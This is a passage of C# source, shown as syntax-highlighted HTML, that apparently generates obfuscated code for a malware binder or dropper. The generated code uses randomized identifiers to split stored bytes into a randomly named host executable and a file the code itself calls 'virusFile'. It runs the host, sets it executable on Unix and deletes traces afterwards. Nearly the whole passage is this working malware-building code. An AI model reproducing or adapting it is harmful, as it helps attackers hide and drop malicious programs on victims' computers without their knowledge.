            </span><span class="sc6">"   "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">20</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".WriteByte((byte)"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">21</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"} \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">20</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".Flush(); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">20</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".Close(); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">19</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".Close(); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">17</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".Close(); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"File.Delete(@\""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">encFile</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\"); \n"</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc2">//rebuildvars is nice, we can kind of move this around
</span><span class="sc0">            </span><span class="sc2">//to different parts of the code. 
</span><span class="sc0">            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">rebuildVars</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"int "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">22</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = ("</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">blocks</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" / 2); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"int "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">23</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = ("</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hlength</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" / "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">22</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"int "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">24</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = ("</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">vlength</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" / "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">22</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"byte[] "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">26</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = new byte["</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hlength</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"]; \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"byte[] "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">25</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = new byte["</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">vlength</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"]; \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"int "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">27</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = 0; \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"int "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">28</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = 0; \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"int "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">29</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">24</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"; \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"int "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">30</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">23</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"; \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"string "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">31</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = \""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">seq</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\"; \n"</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">rebuild</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"FileStream "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">32</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = new FileStream(@\""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">ofFile</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\", FileMode.Open, FileAccess.Read); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"BinaryReader "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">34</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = new BinaryReader("</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">32</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"CharEnumerator "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">33</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">31</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".GetEnumerator(); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"while("</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">33</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".MoveNext()) { \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"if("</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">33</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".Current.Equals('1')) { \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"   for(int "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">36</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">27</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"; "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">36</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" &lt; "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">29</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"; "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">36</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"++) { \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"       "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">25</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"["</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">36</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"] = "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">34</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".ReadByte(); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"   } \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"   "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">27</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">29</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"; \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"   "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">29</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">29</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" + "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">24</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"; \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"} else { \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"   for(int "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">36</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">28</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"; "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">36</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" &lt; "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">30</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"; "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">36</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"++) { \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"       "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">26</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"["</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">36</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"] = "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">34</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".ReadByte(); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"   } \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"   "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">28</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">30</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"; \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"   "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">30</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">30</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" + "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">23</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"; \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"} \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"} \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">34</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".Close(); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">32</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".Close(); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"File.Delete(@\""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">ofFile</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\"); \n"</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">hostfile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">myDir</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">slash</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">RandomWords</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".exe"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">writeHostBytes</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"FileStream "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">37</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = new FileStream(@\""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hostfile</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\", FileMode.Create, FileAccess.Write); \n "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"BinaryWriter "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">38</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = new BinaryWriter("</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">37</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"); \n "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"for(int "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">40</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = 0; "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">40</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" &lt; "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">26</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".Length; "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">40</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"++) { \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">38</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".BaseStream.WriteByte("</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">26</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"["</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">40</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"]); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"} \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">38</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".Flush(); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">38</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".Close(); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">37</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".Close(); \n"</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">executeHost</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"\n try { \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"   if(Convert.ToString(Environment.OSVersion).Substring(0,4).ToLower() == \"unix\") { \n "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"       Process.Start(@\"chmod +x "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hostfile</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\").WaitForExit(); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"   } \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"   Process.Start(@\""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hostfile</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\").WaitForExit(); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"   File.Delete(@\""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hostfile</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\"); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"} catch { } \n"</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">virusFile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">myDir</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">slash</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">RandomWords</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".exe"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">writeVirusBytes</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"FileStream "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">41</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = new FileStream(@\""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">virusFile</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\", FileMode.Create, FileAccess.Write); \n "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"BinaryWriter "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">42</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = new BinaryWriter("</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">41</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"); \n "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"for(int "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">39</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" = 0; "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">39</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" &lt; "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">25</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".Length; "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hashish</span><span class="sc10">[</span><span class="sc4">39</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"++) { \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
